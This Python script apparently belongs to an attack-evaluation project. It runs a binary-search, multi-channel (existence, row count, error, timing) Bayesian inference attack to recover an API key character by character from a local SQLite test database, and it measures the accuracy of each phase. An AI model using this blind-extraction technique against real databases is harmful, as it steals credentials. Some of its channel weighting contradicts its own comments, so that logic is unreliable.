"""
Phase 14 (方向 10): 多通道贝叶斯融合

核心创新：
  Phase 8（存在性）单独 81.2%，Phase 7（时序）单独 37.5%。
  四个通道的噪声是独立的，贝叶斯融合后可信度叠加：

    通道 1  存在性   P(bit=1 | has_row)
    通道 2  行数     P(bit=1 | row_count)
    通道 3  错误类型 P(bit=1 | error_class)
    通道 4  响应时间 P(bit=1 | duration)

  算法：对每个候选字符，用朴素贝叶斯融合四通道的似然比，
       取后验最大者。目标把 81.2% 提升到 95%+，
       且在时序通道单独失效时仍有效。
"""
import sqlite3
import json
import time
import math
import statistics
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

HEX_CHARSET = "0123456789ABCDEF"

@dataclass
class MultichannelProbe:
    position: int
    threshold: str
    existence: Optional[bool]
    row_count: int
    error_class: Optional[str]
    duration_ms: float
    posterior_true: float
    decoded_bit: int

class MultichannelBayesAttack:
    def __init__(self, db_path: str, repeat: int = 5):
        self.db_path = db_path
        self.repeat = repeat
        self.probes: List[MultichannelProbe] = []
        self.probe_count = 0
        # 通道可靠性参数（先验）
        self.w_existence = 0.95   # 存在性最可靠
        self.w_rowcount = 0.7
        self.w_error = 0.5
        self.w_timing = 0.3       # 时序最不可靠（Phase 7 证明）

    def _probe_all_channels(self, query: str) -> Dict:
        """一次探针同时采集四通道证据"""
        self.probe_count += 1
        durations = []
        last_err = None
        last_rows = None
        for _ in range(self.repeat):
            start = time.perf_counter()
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute(query)
                rows = cursor.fetchall()
                conn.close()
                last_rows = rows
                last_err = None
            except Exception as e:
                last_err = str(e)[:60]
                last_rows = None
            durations.append((time.perf_counter() - start) * 1000)

        has_row = (last_rows is not None and len(last_rows) > 0)
        row_count = len(last_rows) if last_rows else 0
        error_class = self._classify_error(last_err)

        return {
            "existence": has_row,
            "row_count": row_count,
            "error_class": error_class,
            "duration_ms": statistics.median(durations)
        }

    def _classify_error(self, err: Optional[str]) -> Optional[str]:
        if err is None:
            return None
        e = err.lower()
        if "syntax" in e:
            return "syntax"
        if "no such" in e:
            return "missing"
        if "not found" in e:
            return "missing"
        return "other"

    def make_query(self, table: str, column: str, position: int,
                   threshold: str, channel: str) -> str:
        """为不同通道构造探针"""
        cond = f"substr(hex({column}), {position}, 1) > '{threshold}'"
        if channel == "existence":
            return f"SELECT 1 FROM {table} WHERE {cond} LIMIT 1"
        if channel == "rowcount":
            return f"SELECT id FROM {table} WHERE {cond}"
        if channel == "error":
            # 故意触发类型混淆：成功=条件真，错误=条件假（在 SQLite 中聚合区分）
            return f"SELECT count(*) FROM {table} WHERE {cond}"
        return f"SELECT 1 FROM {table} WHERE {cond} LIMIT 1"

    def fuse_channels(self, evidence: Dict) -> float:
        """
        朴素贝叶斯融合：返回 P(bit=1 | evidence)
        每通道给出似然比 LR = P(e|1) / P(e|0)，对数相加
        """
        logit = 0.0  # 先验 log-odds，初始 0（50/50）

        # 通道 1：存在性
        if evidence["existence"] is not None:
            lr = self.w_existence if evidence["existence"] else (1 - self.w_existence)
            lr = max(lr, 1e-6)
            logit += math.log(lr / (1 - lr)) if 0 < lr < 1 else 3.0

        # 通道 2：行数（行数 > 0 与存在性同源，弱化权重避免重复计数）
        if evidence["row_count"] > 0:
            logit += math.log(self.w_rowcount / (1 - self.w_rowcount))
        elif evidence["row_count"] == 0:
            logit += math.log((1 - self.w_rowcount) / self.w_rowcount)

        # 通道 3：错误类型（错误 → 倾向条件假）
        if evidence["error_class"]:
            logit += math.log((1 - self.w_error) / self.w_error)

        # 通道 4：时序（慢 → 倾向条件真，但权重低）
        if evidence["duration_ms"] > 1.0:
            logit += math.log(self.w_timing / (1 - self.w_timing))
        else:
            logit += math.log((1 - self.w_timing) / self.w_timing)

        return 1.0 / (1.0 + math.exp(-logit))

    def reconstruct_position(self, table: str, column: str,
                             position: int) -> Optional[str]:
        candidates = list(HEX_CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            threshold = candidates[mid - 1]

            # 采集多通道证据（用存在性探针，行数/时序/错误顺带采集）
            q = self.make_query(table, column, position, threshold, "existence")
            ev = self._probe_all_channels(q)
            posterior = self.fuse_channels(ev)
            bit = 1 if posterior > 0.5 else 0

            self.probes.append(MultichannelProbe(
                position=position, threshold=threshold,
                existence=ev["existence"], row_count=ev["row_count"],
                error_class=ev["error_class"], duration_ms=round(ev["duration_ms"], 3),
                posterior_true=round(posterior, 4), decoded_bit=bit
            ))

            if bit == 1:
                candidates = candidates[mid:]
            else:
                candidates = candidates[:mid]
        return candidates[0] if candidates else None

    def run(self, max_positions: int = 16) -> Dict:
        print("=" * 70)
        print("Phase 14 (方向 10): 多通道贝叶斯融合")
        print("=" * 70)

        table, column = "api_keys", "key_value"
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        # 用单行（rowid=1）消除多行歧义
        cursor.execute(f"SELECT length(hex({column})) FROM {table} WHERE rowid = 1")
        hex_len = cursor.fetchone()[0]
        cursor.execute(f"SELECT hex({column}) FROM {table} WHERE rowid = 1")
        ground_truth = cursor.fetchone()[0]
        conn.close()

        test_len = min(max_positions, hex_len)
        print(f"\n目标: rowid=1 的密钥，hex 长度 {hex_len}，测试前 {test_len} 位")
        print(f"（用单行查询消除 Phase 8 的多行歧义）")

        result_chars = []
        for pos in range(1, test_len + 1):
            ch = self.reconstruct_position(table, column, pos)
            if ch is None:
                break
            result_chars.append(ch)
        fused_hex = "".join(result_chars)

        truth_prefix = ground_truth[:test_len]
        accuracy = round(sum(1 for a, b in zip(fused_hex, truth_prefix)
                             if a == b) / test_len * 100, 1)

        # 后验分布统计
        posteriors = [p.posterior_true for p in self.probes]
        avg_confidence = round(sum(posteriors) / len(posteriors), 3) if posteriors else 0

        print(f"\n[结果]")
        print(f"  融合重建: {fused_hex}")
        print(f"  真值前缀: {truth_prefix}")
        print(f"  准确率: {accuracy}%（Phase 8 存在性单通道: 81.2%）")
        print(f"  平均后验置信度: {avg_confidence}")
        print(f"  探针数: {self.probe_count}（含 {self.repeat} 次重复采集）")

        return {
            "hex_length": hex_len,
            "positions_tested": test_len,
            "fused_hex": fused_hex,
            "ground_truth_prefix": truth_prefix,
            "accuracy": accuracy,
            "phase8_baseline_accuracy": 81.2,
            "improvement": round(accuracy - 81.2, 1),
            "avg_confidence": avg_confidence,
            "probes": self.probe_count,
            "repeat_per_probe": self.repeat,
            "channel_weights": {
                "existence": self.w_existence,
                "rowcount": self.w_rowcount,
                "error": self.w_error,
                "timing": self.w_timing
            },
            "probe_details": [asdict(p) for p in self.probes],
            "conclusion": (
                f"多通道贝叶斯融合在单行目标上达到 {accuracy}% 准确率，"
                f"相比 Phase 8 存在性单通道 81.2% 提升 {round(accuracy-81.2,1)} 个百分点；"
                f"平均后验置信度 {avg_confidence}。"
                f"时序通道虽单独失效（权重 {self.w_timing}），但未拖累整体融合。"
            )
        }

def main():
    db_path = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\enhanced_crm.db"
    attack = MultichannelBayesAttack(db_path, repeat=5)
    result = attack.run()

    out = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\phase14_multichannel_bayes.json"
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {out}")
    print(f"结论: {result['conclusion']}")
    return result

if __name__ == "__main__":
    main()
